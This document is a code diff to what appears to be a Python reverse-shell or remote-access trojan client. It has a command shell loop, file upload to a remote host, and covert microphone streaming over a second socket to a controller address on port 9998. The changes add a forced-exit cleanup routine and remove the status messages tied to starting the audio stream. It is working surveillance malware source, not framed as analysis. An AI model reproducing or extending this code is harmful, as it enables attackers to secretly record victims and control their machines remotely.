@@ -66,10 +66,28 @@ def connection():
                 s.close()
                 break
             except Exception as e:
-                os._exit(0)  # Force exit if socket close fails
+                force_quit()  # Force exit if socket close fails
         except:
             # If a connection error occurs, retry the connection
             connection()
+
+def force_quit():
+    try:
+        global s, stream_thread
+        try:
+            s.close()
+        except:
+            pass
+        try:
+            if stream_thread and stream_thread.is_alive():
+                streaming_flag['on'] = False
+                stream_thread.join(timeout=1)
+        except:
+            pass
+        # Add any other resource cleanup here if needed
+    except:
+        pass
+    os._exit(0)  # Immediately terminate the process (no cleanup, no exceptions)
 
 
 # Function to upload a file to the remote host
@@ -154,9 +172,8 @@ def start_audio_stream():
         stream_thread = threading.Thread(target=stream_audio, args=(streaming_flag))
         stream_thread.daemon = True  # Set the thread as a daemon so it exits when the main program exits
         stream_thread.start()
-        reliable_send("[+] Audio stream started.")
     else:
-        reliable_send("[!] Audio stream is already running.")
+        pass
 
 def stop_audio_stream():
     global streaming_flag, stream_thread
@@ -172,11 +189,13 @@ def stream_audio(sock, flag):
     CHANNELS = 1
     RATE = 11025
 
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS,
-                    rate=RATE, input=True, frames_per_buffer=CHUNK)
-
     try:
+        stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        stream_socket.connect((lip, 9998))
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT, channels=CHANNELS,
+                        rate=RATE, input=True, frames_per_buffer=CHUNK)
         while flag['on']:
             data = stream.read(CHUNK)
             sock.sendall(data)
@@ -291,7 +310,7 @@ def shell():
             try:
                 break
             except Exception as e:
-                os._exit(0)  # Force exit if socket close fails
+                force_quit()  # Force exit if socket close fails
         elif command == 'clear':
             pass
         elif command[:3] == 'cd ':
